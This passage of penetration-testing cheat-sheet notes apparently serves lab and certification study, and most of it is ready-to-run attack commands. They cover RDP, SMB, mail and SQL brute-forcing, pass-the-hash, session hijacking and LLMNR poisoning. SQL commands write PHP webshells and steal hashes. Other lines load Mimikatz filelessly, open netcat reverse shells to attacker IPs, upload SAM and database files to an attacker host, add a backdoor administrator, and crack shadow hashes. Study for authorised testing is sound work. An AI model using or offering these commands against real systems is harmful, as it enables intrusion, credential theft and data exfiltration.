hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```


---
<a id="cpts-exploits-service-exploits-rdp-76d94045--rdp-session-hijacking"></a>

### RDP Session Hijacking
```cmd
C:\htb> query user

#If we have SYSTEM privileges
C:\htb> tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME> 

#If we don't have SYSTEM privileges but we are Administrator
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
C:\htb> net start sessionhijack
```


---

<a id="cpts-exploits-service-exploits-rdp-76d94045--rdp-pass-the-hash-pth"></a>

### RDP Pass-the-Hash (PtH)
```cmd
xfreerdp3 /u:svc.callback /v:10.200.150.10 /pth:66338f1647cc6a33fd686cd20e7bb917
```

<a id="cpts-exploits-service-exploits-rdp-76d94045--adding-the-disablerestrictedadmin-registry-key"></a>

#### Adding the DisableRestrictedAdmin Registry Key
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


---

<a id="cpts-exploits-service-exploits-smb-0ab037f4"></a>

<a id="cpts-exploits-service-exploits-smb-0ab037f4--smb"></a>

# SMB


List shares on smb
```shell-session
smbclient -N -L //10.129.14.128
```

Use smbmap for simpler automation
```shell
smbmap -H 10.129.14.128
smbmap -H 10.129.14.128 -r notes

# use this to download files
smbmap -H 10.129.14.128 --download "notes\note.txt"

# use this to upload files
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

<a id="cpts-exploits-service-exploits-smb-0ab037f4--use-enum4linux-to-do-some-quick-enumeration"></a>

#### Use enum4linux to do some quick enumeration
```shell
enum4linux 10.10.11.45 -A -C
```


<a id="cpts-exploits-service-exploits-smb-0ab037f4--brute-forcing-smb"></a>

### Brute Forcing SMB 
```shell
netexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

<a id="cpts-exploits-service-exploits-smb-0ab037f4--useful-netexec-tags"></a>

##### Useful netexec tags
```shell
--loggedon-users
--sam
```


<a id="cpts-exploits-service-exploits-smb-0ab037f4--rce-through-impacket-psexec"></a>

#### RCE through Impacket-Psexec
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

<a id="cpts-exploits-service-exploits-smb-0ab037f4--llmnr-poisoning"></a>

#### LLMNR Poisoning
```shell
sudo responder -I ens33
```

We can use ntlmrelayx on top of this if required refer to htb academy is really needed


---

<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e"></a>

<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--smtp-imap-pop3"></a>

# SMTP-IMAP-POP3


Basic Enumeration
```shell
host -t MX hackthebox.eu
host -t MX microsoft.com

dig mx plaintext.do | grep "MX" | grep -v ";"
dig mx inlanefreight.com | grep "MX" | grep -v ";"

host -t A mail1.inlanefreight.htb.
```


---

<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--automated-enumeration"></a>

### Automated Enumeration

smtp-user-enum
```shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

O365 Spray
```shell
python3 o365spray.py --validate --domain msplaintext.xyz (check if it is o365)
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

---
<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--password-attacks"></a>

### Password Attacks
We can use hydra to perform a brute force, just change the protocol at the back (pop3,imap4,smtp)
```shell
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

If cloud services support SMTP, POP3 or IMAP4 protocols, we can use o365 to spray as hydra is usually blocked 
```shell
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

---
<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--vrfy-command"></a>

#### VRFY Command
Use this command after connecting to telnet to enumerate users on the system
```shell
telnet 10.10.110.20 25

VRFY root
VRFY www-data
```

<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--expn-command"></a>

#### EXPN Command
Similar to VRFY but this one can query groups 
```shell
telnet 10.10.110.20 25

EXPN john
EXPN support-team
EXPN all
```

<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--rcpt-to-command"></a>

#### RCPT TO Command
Identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
```shell
telnet 10.10.110.20 25

MAIL FROM:test@htb.com
RCPT TO:julio
RCPT TO:john
```

<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--user-command"></a>

#### USER Command
Enumerate users command again
```shell
telnet 10.10.110.20 110

USER julio
USER john
```


---

<a id="cpts-exploits-service-exploits-sql-fcb4d003"></a>

<a id="cpts-exploits-service-exploits-sql-fcb4d003--sql"></a>

# SQL


<a id="cpts-exploits-service-exploits-sql-fcb4d003--authentication-commands"></a>

### Authentication commands
```shell
vernonlim03@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

# Connect to mssql from linux
vernonlim03@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
vernonlim03@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

# Authenticate using Active Directory
vernonlim03@htb[/htb]$ sqsh -S 10.129.203.7 -U <SERVERNAME>\\julio -P 'MyPassword!' -h
```


<a id="cpts-exploits-service-exploits-sql-fcb4d003--common-commands-in-mysql-shell"></a>

### Common Commands in mysql shell
```shell
SHOW DATABASES;
SELECT name FROM master.dbo.sysdatabases
USE <database>
SHOW TABLES;
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
SELECT * FROM users;
```
(IF USING sqsh, rmb to execute 'go' after every command)


<a id="cpts-exploits-service-exploits-sql-fcb4d003--xp_cmdshell-mssql"></a>

### XP_CMDSHELL (mssql)
```shell
xp_cmdshell 'whoami'

#Steps to enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

---

<a id="cpts-exploits-service-exploits-sql-fcb4d003--writing-to-local-files-mysql"></a>

### Writing to local files (mysql)
```shell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

(Try to enable secure_file_priv if unable to write)
show variables like "secure_file_priv";

```

<a id="cpts-exploits-service-exploits-sql-fcb4d003--writing-to-local-files-mssql"></a>

### Writing to local files (mssql)
```shell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE

#Steps to enable file writing privileges
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
```

---

<a id="cpts-exploits-service-exploits-sql-fcb4d003--read-local-files-mysql"></a>

### Read local files (mysql)
```shell
select LOAD_FILE("/etc/passwd");
```
<a id="cpts-exploits-service-exploits-sql-fcb4d003--read-local-files-mssql"></a>

### Read local files (mssql)
```shell
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

---

<a id="cpts-exploits-service-exploits-sql-fcb4d003--hash-stealing-with-responder"></a>

### Hash stealing with responder

Start responder or impacket-smbserver first on interface
Then use XP_SUBDIRS or XP_DIRTREE to point to attacker machine
```shell
EXEC master..xp_dirtree '\\10.10.110.17\share\'
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```


--- 
<a id="cpts-exploits-service-exploits-sql-fcb4d003--priv-esc-with-impersonate-privilege"></a>

### Priv Esc with Impersonate Privilege

SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user.

**Identify users that we can impersonate**
```shell
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

**Verifying our Current User and Role**
```shell
SELECT SYSTEM_USER #Get current user
SELECT IS_SRVROLEMEMBER('sysadmin') #Check if user is sysadmin (0 means no)
```

**Impersonating Users**
```shell
EXECUTE AS LOGIN = 'sa' #Impersonating the user: sa
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database.

---

<a id="cpts-exploits-service-exploits-sql-fcb4d003--communicate-with-other-databases-mssql"></a>

### Communicate with other databases (mssql)

Identify linked Servers in MSSQL
```shell
SELECT srvname, isremote FROM sysservers
```

Executing commands on linked server
```shell
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```


---

<a id="cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171"></a>

<a id="cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171--convert-ccache-or-kirbi-file-to-and-fro"></a>

# Convert ccache or kirbi file to and fro


```shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```


---

<a id="cpts-misc-double-pivot-ac26bf28"></a>

<a id="cpts-misc-double-pivot-ac26bf28--double-pivot"></a>

# Double Pivot


1) Connect via RDP to the initial machine
2) Bring SocksOverRDP.zip and Proxifier.zip to the machine
3) Unzip both
4) Ensure real time protection is disabled and run regsvr32.exe
5) RDP to the second machine and bring over the socksoverrdp-server.exe
6) Run it as admistrator
7) On the initial machine, run proxifier app
8) Under profiles add the loopback:1080 and press ok
9) Then we can access the hidden system, if using RDP rmb to go to experience and set to modem


```cmd-session
regsvr32.exe SocksOverRDP-Plugin.dll
```

<a id="cpts-misc-double-pivot-ac26bf28--ligolo"></a>

### Ligolo

```shell
# On attacker machine:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.<private subnet>.0/24 dev ligolo
cd ~/Downloads/scripts/pivoting/ligolo-ng/
./proxy -selfcert

# On target machine:
wget 192.168.xxx.xxx:8000/pivoting/ligolo-ng/windows64-agent/agent.exe -O agent.exe
./agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert

# On attacker machine (in ligolo control panel):
session
<select session number>
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
start

# On second pivot machine
./agent.exe -connect <first machine ip>:11601 -ignore-cert
session
<select session number>

sudo ip tuntap add mode tun appsrv-tunnel
sudo ip link set appsrv-tunnel up
sudo ip route add 172.16.6.0/24 dev appsrv-tunnel

tunnel_start --tun appsrv-tunnel
```


---

<a id="cpts-misc-gaining-shell-access-b83293f9"></a>

<a id="cpts-misc-gaining-shell-access-b83293f9--gaining-shell-access"></a>

# Gaining Shell Access


<a id="cpts-misc-gaining-shell-access-b83293f9--windows"></a>

### Windows
- RDP
- WINRM
- WMI

<a id="cpts-misc-gaining-shell-access-b83293f9--linux"></a>

### Linux
- SSH
- Rsync (r-services)


---

<a id="cpts-misc-ms-office-macro-8ec8c7ff"></a>

<a id="cpts-misc-ms-office-macro-8ec8c7ff--ms-office-macro"></a>

# MS Office Macro

Use the MMG-LO folder in the cpts-tools directory

![Pasted image 20250618150605.png](cpts/assets/Pasted%20image%2020250618150605.png)

```bash
python3 mmg-ods.py windows 192.168.45.202 443
```


---

<a id="cpts-misc-pivot-with-ligolo-111fca60"></a>

<a id="cpts-misc-pivot-with-ligolo-111fca60--pivot-with-ligolo"></a>

# Pivot with Ligolo

```shell
# On attacker machine:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.<private subnet>.0/24 dev ligolo
cd ~/Downloads/scripts/pivoting/ligolo-ng/
./proxy -selfcert

# On target machine:
wget 192.168.xxx.xxx:8000/pivoting/ligolo-ng/windows64-agent/agent.exe -O agent.exe
./agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert

# On attacker machine (in ligolo control panel):
session
<select session number>
start

# To allow machines in the private subnet to reach your host machine
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 (to access nc listener of port 4444)
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 (to access webserver)
listener_add --addr 0.0.0.0:1236 --to 127.0.0.1:8010 (to access upload server)

# On the target machine:
do not use attacker machine ip, but the machine you are tunneling from.
i.e.
Attacker 192.168.234.63
ms01 192.168.77.10 10.10.77.10 (comprimised machine)
ms02 10.10.77.11

# On attacker machine:
nc -lvnp 4444

# On target ms02:
nc 10.10.77.10 1234 -e powershell
```



---

<a id="cpts-misc-runas-another-user-4be36188"></a>

<a id="cpts-misc-runas-another-user-4be36188--runas-another-user"></a>

# Runas another user

```cmd
runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.202 4444"
runas /user:Administrator "reverse.exe"
```


---

<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6"></a>

<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6--search-for-flag-on-compromised-system"></a>

# Search for flag on compromised system


<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6--linux"></a>

#### Linux
```bash
find / -type f -iname "flag.txt" 2>/dev/null
find / -type f -iname "local.txt" 2>/dev/null
find / -type f -iname "proof.txt" 2>/dev/null
find / -type f -iname "user.txt" 2>/dev/null
find / -type f -iname "root.txt" 2>/dev/null
```

<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6--windows"></a>

#### Windows
```cmd
dir /r /s c:\*local.txt
dir /a /s c:\*proof.txt
Get-ChildItem -Path C:\ -Recurse -Force -Filter *local*.txt
Get-ChildItem -Path C:\ -Recurse -Force -Filter *proof*.txt
```



---

<a id="cpts-misc-transferring-files-linux-5d70baa3"></a>

<a id="cpts-misc-transferring-files-linux-5d70baa3--transferring-files-linux"></a>

# Transferring Files (Linux)


<a id="cpts-misc-transferring-files-linux-5d70baa3--base64-encodedecode"></a>

#### Base64 Encode/Decode

On Kali:
```bash
md5sum id_rsa #take note of the hash value of the file

cat id_rsa | base64 -w 0;echo 
```

On Victim Linux:
```shell
echo -n '<BASE64 ENCODED STRING>' | base64 -d > id_rsa

md5sum id_rsa # check if md5 sum matches
```


<a id="cpts-misc-transferring-files-linux-5d70baa3--web-downloads-with-wget-and-curl"></a>

#### Web Downloads with Wget and cURL

```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


<a id="cpts-misc-transferring-files-linux-5d70baa3--fileless-downloads-with-wget-and-curl"></a>

#### Fileless Downloads with Wget and cURL

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


<a id="cpts-misc-transferring-files-linux-5d70baa3--download-using-bash-dev-tcp"></a>

#### Download using bash dev tcp

```shell
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```


<a id="cpts-misc-transferring-files-linux-5d70baa3--secure-copy-ssh"></a>

#### Secure Copy (SSH)

```shell
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

<a id="cpts-misc-transferring-files-linux-5d70baa3--upload-server"></a>

#### Upload Server
```bash
python -m venv myfirstproject
source myfirstproject/bin/activate
pip install uploadserver
python -m uploadserver 80

#command to upload from victim
curl -X POST http://192.168.45.224/upload -F 'files=@db.sqlite3'
```


---

<a id="cpts-misc-transferring-files-windows-089b5bd9"></a>

<a id="cpts-misc-transferring-files-windows-089b5bd9--transferring-files-windows"></a>

# Transferring Files (Windows)

<a id="cpts-misc-transferring-files-windows-089b5bd9--python-server-certutil"></a>

#### Python Server + Certutil

On Kali:
```shell
python3 -m http.server 80
```

On Windows:

```Shell
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
```

<a id="cpts-misc-transferring-files-windows-089b5bd9--base64-encodedecode"></a>

#### Base64 Encode/Decode
On Kali:
```bash
md5sum id_rsa #take note of the hash value of the file

cat id_rsa | base64 -w 0;echo 
```

On Windows:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64 ENCODE>"))

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 #verify md5 hash
```


<a id="cpts-misc-transferring-files-windows-089b5bd9--powershell-web-downloads"></a>

#### Powershell Web Downloads

<a id="cpts-misc-transferring-files-windows-089b5bd9--file-download"></a>

###### File Download
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

<a id="cpts-misc-transferring-files-windows-089b5bd9--fileless-download"></a>

###### Fileless Download
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```


<a id="cpts-misc-transferring-files-windows-089b5bd9--powershell-invoke-web-request"></a>

#### Powershell Invoke Web Request
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```


<a id="cpts-misc-transferring-files-windows-089b5bd9--bypass-download-commands"></a>

#### Bypass Download Commands

<a id="cpts-misc-transferring-files-windows-089b5bd9--internet-explorer-bypass"></a>

###### Internet Explorer Bypass
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

<a id="cpts-misc-transferring-files-windows-089b5bd9--untrusted-ssltls-certificate"></a>

###### Untrusted SSL/TLS Certificate
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


<a id="cpts-misc-transferring-files-windows-089b5bd9--smb-transfer"></a>

#### SMB Transfer

<a id="cpts-misc-transferring-files-windows-089b5bd9--start-smb-server"></a>

###### Start SMB Server
On Kali:
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On Windows:
```bash
net use n: \\192.168.220.133\share /user:test test

copy n:\nc.exe
```


<a id="cpts-misc-transferring-files-windows-089b5bd9--ftp-transfer"></a>

#### FTP Transfer

<a id="cpts-misc-transferring-files-windows-089b5bd9--start-ftp-server"></a>

###### Start FTP Server
On Kali:
```shell
sudo python3 -m pyftpdlib --port 21
```

On Powershell:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

On Shell:
```shell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
```

<a id="cpts-misc-transferring-files-windows-089b5bd9--xfreerdp"></a>

#### XfreeRDP
```bash
xfreerdp /drive:kali,.
```


<a id="cpts-misc-transferring-files-windows-089b5bd9--upload-server"></a>

#### Upload Server
```bash
python -m venv myfirstproject
source myfirstproject/bin/activate
pip install uploadserver
python -m uploadserver 80

#command to upload from victim
curl.exe -X POST http://192.168.45.202/upload -F "files=@C:\sam.save"
```


---

<a id="cpts-misc-transferring-files-9a1f8b61"></a>

<a id="cpts-misc-transferring-files-9a1f8b61--transferring-files"></a>

# Transferring Files


<a id="cpts-misc-transferring-files-9a1f8b61--wget"></a>

### wget

On Kali
```bash
cd /tmp
python3 -m http.server 8000
```

On Victim
```bash
wget http://10.10.14.1:8000/linenum.sh
```
```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
(-o is for output name)


<a id="cpts-misc-transferring-files-9a1f8b61--scp"></a>

### scp

On Kali
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
![Pasted image 20250325024416.png](cpts/assets/Pasted%20image%2020250325024416.png)


<a id="cpts-misc-transferring-files-9a1f8b61--using-base64-firewall-evasion"></a>

### Using Base64 (Firewall evasion)

Only use this if firewall ends up blocking our other methods

On Kali
![Pasted image 20250325025014.png](cpts/assets/Pasted%20image%2020250325025014.png)
```bash
base64 shell -w 0
```
Ctrl-C the value afterwards


On Victim
![Pasted image 20250325025103.png](cpts/assets/Pasted%20image%2020250325025103.png)
```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAlIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```


<a id="cpts-misc-transferring-files-9a1f8b61--python"></a>

#### Python

```shell
p

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

```


<a id="cpts-misc-transferring-files-9a1f8b61--php"></a>

#### PHP

```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless method
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


<a id="cpts-misc-transferring-files-9a1f8b61--ruby"></a>

#### Ruby

```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```


<a id="cpts-misc-transferring-files-9a1f8b61--perl"></a>

#### Perl

```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```


<a id="cpts-misc-transferring-files-9a1f8b61--javascript"></a>

#### Javascript

 Save this script to wget.js
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

After doing the above execute this command to download files
```shell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


<a id="cpts-misc-transferring-files-9a1f8b61--vbscript"></a>

#### VBScript

Save this script to wget.vbs
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

After doing the above 
```shell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```


<a id="cpts-misc-transferring-files-9a1f8b61--netcat"></a>

#### Netcat

On Receiving Machine:
```bash
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

On Sending Machine:
```shell
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

<a id="cpts-misc-transferring-files-9a1f8b61--netcat-second-method"></a>

##### Netcat (Second Method)

On Sending Machine:
```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

On Receiving Machine:
```shell
nc 192.168.49.128 443 > SharpKatz.exe

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


<a id="cpts-misc-transferring-files-9a1f8b61--winrm-file-transfer"></a>

#### WinRM - File Transfer

```powershell
$Session = New-PSSession -ComputerName DATABASE01

Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


<a id="cpts-misc-transferring-files-9a1f8b61--rdp-file-transfer"></a>

#### RDP - File Transfer

<a id="cpts-misc-transferring-files-9a1f8b61--mounting-share"></a>

###### Mounting Share
```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```



---

<a id="cpts-misc-make-new-admin-user-in-windows-e17c21fa"></a>

<a id="cpts-misc-make-new-admin-user-in-windows-e17c21fa--make-new-admin-user-in-windows"></a>

# make new admin user in windows


```cmd
net user vernon password /add
net localgroup administrators vernon /add
```


---

<a id="cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec"></a>

<a id="cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec--non-tty-shell-to-tty-shell"></a>

# non-tty shell to tty shell


Test to see any of these are installed on the system we can then use the installed service to upgrade our non-tty shell to a tty shell.


```bash
#python to tty shell
python -c 'import pty; pty.spawn("/bin/sh")'

#/bin/sh to shell
/bin/sh -i
sh: no job control in this shell
sh-4.2$

# perl to shell
perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";

# ruby to shell
ruby: exec "/bin/sh"

# lua to shell
lua: os.execute('/bin/sh')

# awk to shell
awk 'BEGIN {system("/bin/sh")}'

# find to shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# vim to shell
vim -c ':!/bin/sh'

# vim escape
vim
:set shell=/bin/sh
:shell

# permission consideration
ls -la <path/to/fileorbinary>

# sudo -l to see what we can do for priv esc
sudo -l

```




---

<a id="cpts-post-exploits-port-forwarding-d33c6cbd"></a>

<a id="cpts-post-exploits-port-forwarding-d33c6cbd--port-forwarding"></a>

# Port Forwarding


<a id="cpts-post-exploits-port-forwarding-d33c6cbd--chisel"></a>

### Chisel

On kali
```bash
./chisel_1.10.1_linux_amd64 server -port 2222 --socks5 -reverse
```

On Pivot Machine
```
./chisel_1.10.1_linux_amd64 client <ATTACKER_IP>:2222 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
./chisel_1.10.1_linux_amd64 client 192.168.45.202:2222 R:2344:10.4.181.215:22

```

Then do whatever service I want at loopback addy and port specified in first command
```bash
ssh database_admin@127.0.0.1 -p 2222
```


<a id="cpts-post-exploits-port-forwarding-d33c6cbd--ssh"></a>

### SSH

```
ssh dev@192.168.223.150 -L 8000:127.0.0.1:8000

#then we can just point to 127.0.0.1 port 8000 to get shit done
```


---

<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121"></a>

<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--cracking-login-credentials"></a>

# Cracking Login Credentials

- /etc/passwd
- /etc/shadow
- /etc/security/opasswd

---
<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--etcpasswd"></a>

### /etc/passwd

Try to look for available users first
See if the file is writable
If it is writable, just remove the password fielded with an x behind the root user and su to root

---

<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--etcshadow"></a>

### /etc/shadow

Nothing much we can do with this file as well 
Just check if it is writable and delete the encrypted password portion and see where it leads


---

<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--cracking-credentials"></a>

### Cracking credentials

<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--passwd-shadow"></a>

###### Passwd + Shadow
```shell
vernonlim03@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
vernonlim03@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
vernonlim03@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
vernonlim03@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--opasswd"></a>

###### Opasswd
```shell
vernonlim03@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1

# Output the last field behind the $ and put them in md5-hashes.list

vernonlim03@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```


---

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf"></a>

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--credential-hunting"></a>

# Credential Hunting


<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--key-files-to-look-for"></a>

### Key files to look for
![Pasted image 20250429162547.png](cpts/assets/Pasted%20image%2020250429162547.png)

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-configuration-files-based-on-extension"></a>

#### Command to search for configuration files based on extension
```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

